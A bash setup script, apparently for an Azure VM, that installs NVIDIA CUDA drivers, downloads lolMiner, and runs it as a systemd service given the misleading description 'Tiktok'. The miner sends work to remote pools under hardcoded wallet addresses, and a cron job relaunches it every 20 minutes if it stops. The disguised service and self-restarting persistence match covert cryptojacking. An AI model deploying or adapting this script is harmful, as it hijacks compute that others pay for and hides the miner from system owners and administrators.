sudo sed -i '/RANDFILE/c\#RANDFILE' /etc/ssl/openssl.cnf
cd /home
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-keyring_1.0-1_all.deb
sudo dpkg -i cuda-keyring_1.0-1_all.deb
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub
sudo apt-get update
sudo add-apt-repository --yes ppa:graphics-drivers/ppa
sudo apt-get -y install cuda-drivers-510
sudo apt-get install libcurl3 -y
sudo systemctl enable cron
sudo bash -c 'echo -e "pgrep -f lolMiner >/dev/null && r=1 || r=0\nif [ \$r = 0 ];\nthen\nsudo /bin/bash /home/azure.sh\nfi" > /home/cron.sh'
sudo chmod +x /home/cron.sh
sudo echo  '*/20 * * * * /home/cron.sh' | crontab -
sudo wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.67/lolMiner_v1.67_Lin64.tar.gz
sudo tar xvzf lolMiner_v1.67_Lin64.tar.gz
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/1.67/lolMiner --algo ETCHASH --pool eu.ezil.me:4444 --user 0xCEEC62a6274C569a7c8881bbA51faCDf6B6B0478.zil1v95pzrmxq3t2ythsv5dckf9c488ecpund5ktx9.3060ti --enablezilcache --dualmode KASPADUAL --dualpool pool.woolypooly.com:3113 --dualuser kaspa:qp9rz85zkrz2ljusreur3jzcu7gz2tr70tdpmxcvzydwpmnlu4pj2wm0fynan.3080ti\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
sudo systemctl daemon-reload
sudo systemctl enable deroz.service
echo "Setup completed!"
sudo reboot
